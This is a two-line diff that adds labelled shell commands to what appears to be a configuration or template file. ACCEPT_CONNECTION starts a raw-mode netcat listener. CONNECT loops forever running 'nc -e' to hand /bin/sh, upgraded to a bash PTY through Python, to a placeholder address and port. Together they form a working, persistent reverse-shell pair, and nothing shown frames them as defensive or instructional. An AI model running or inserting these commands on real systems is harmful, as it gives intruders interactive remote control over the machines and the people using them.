@@ -1,0 +1,2 @@
+ACCEPT_CONNECTION: stty raw -echo; nc -vl -S <ADDR> -p <PORT>; stty -raw echo; echo -e "\rDisconnected"
+CONNECT:           while [ 1 ]; do nc -e '/bin/sh -c "printf \"\r\"; python -c \"import pty;pty.spawn('"'/bin/bash'"')\""' <ADDR> <PORT>; done
